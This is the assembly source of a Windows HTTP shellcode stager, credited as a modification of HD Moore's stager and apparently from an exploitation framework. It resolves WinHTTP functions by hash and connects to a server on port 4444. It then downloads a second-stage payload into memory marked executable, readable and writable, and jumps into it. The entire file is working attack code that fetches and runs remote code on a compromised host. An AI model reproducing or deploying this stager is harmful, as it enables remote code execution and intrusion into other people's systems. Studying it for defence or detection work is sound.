;-----------------------------------------------------------------------------;
; Author: Borja Merino (modification of the HD Moore HTTP stager based on WinINet)
; Version: 1.0
;-----------------------------------------------------------------------------;
[BITS 32]
%define u(x) __utf16__(x)
%define HTTP_OPEN_FLAGS 0x00000100
  ;0x00000100  ; WINHTTP_FLAG_BYPASS_PROXY_CACHE

; Input: EBP must be the address of 'api_call'.
; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

load_winhttp:
  push 0x00707474        ; Push the string 'winhttp',0
  push 0x686E6977        ; ...
  push esp               ; Push a pointer to the "winhttp" string
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "winhttp" )

set_retry:
  push byte 6            ; retry 6 times
  pop EDI
  xor ebx, ebx
  mov ecx, edi

push_zeros:
  push ebx               ; NULL values for the WinHttpOpen API parameters
  loop push_zeros

WinHttpOpen:
                         ; Flags [5]
                         ; ProxyBypass (NULL) [4]
                         ; ProxyName (NULL) [3]
                         ; AccessType (DEFAULT_PROXY= 0) [2]
                         ; UserAgent (NULL) [1]
  push 0xBB9D1F04        ; hash( "winhttp.dll", "WinHttpOpen" )
  call ebp

WinHttpConnect:
  push ebx               ; Reserved (NULL) [4]
  push dword 4444        ; Port [3]
  call got_server_uri    ; Double call to get pointer for both server_uri and
server_uri:              ; server_host; server_uri is saved in EDI for later
  dw u('/12345'), 0
got_server_host:
  push eax               ; Session handle returned by WinHttpOpen [1]
  push 0xC21E9B46        ; hash( "winhttp.dll", "WinHttpConnect" )
  call ebp

WinHttpOpenRequest:

  push HTTP_OPEN_FLAGS   ; Flags [7]
  push ebx               ; AcceptTypes (NULL) [6]
  push ebx               ; Referrer (NULL) [5]
  push ebx               ; Version (NULL)  [4]
  push edi               ; ObjectName (URI) [3]
  push ebx               ; Verb (GET method) (NULL)  [2]
  push eax               ; Connect handler returned by WinHttpConnect [1]
  push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
  call ebp
  xchg esi, eax          ; save HttpRequest handler in esi

send_request:

WinHttpSendRequest:
  push ebx               ; Context [7]
  push ebx               ; TotalLength [6]
  push ebx               ; OptionalLength (0) [5]
  push ebx               ; Optional (NULL) [4]
  push ebx               ; HeadersLength (0) [3]
  push ebx               ; Headers (NULL) [2]
  push esi               ; HttpRequest handler returned by WinHttpOpenRequest [1]
  push 0x91BB5895        ; hash( "winhttp.dll", "WinHttpSendRequest" )
  call ebp
  test eax,eax
  jnz short receive_response ; if TRUE call WinHttpReceiveResponse API

try_it_again:
  dec edi
  jnz send_request

; if we didn't allocate before running out of retries, fall through to
; failure

failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp

receive_response:        
                         ; The API WinHttpReceiveResponse needs to be called 
                         ; first to get a valid handler for WinHttpReadData
  push ebx               ; Reserved (NULL) [2]
  push esi               ; Request handler returned by WinHttpSendRequest [1]
  push 0x709D8805        ; hash( "winhttp.dll", "WinHttpReceiveResponse" )
  call ebp
  test eax,eax
  jz failure

allocate_memory:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (4Mb ought to do us)
  push ebx               ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
  xchg eax, ebx          ; place the allocated base address in ebx
  push ebx               ; store a copy of the stage base address on the stack
  push ebx               ; temporary storage for bytes read count
  mov edi, esp           ; &bytesRead

download_more:
  push edi               ; NumberOfBytesRead (bytesRead)
  push 8192              ; NumberOfBytesToRead
  push ebx               ; Buffer
  push esi               ; Request handler returned by WinHttpReceiveResponse
  push 0x7E24296C        ; hash( "winhttp.dll", "WinHttpReadData" )
  call ebp

  test eax,eax           ; if download failed? (optional?)
  jz failure

  mov eax, [edi]
  add ebx, eax           ; buffer += bytes_received

  test eax,eax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop eax                ; clear the temporary storage

execute_stage:
  ret                    ; dive into the stored stage address

got_server_uri:
  pop edi
  call got_server_host   ; put the server_host on the stack (WinHttpConnect API [2])

server_host:
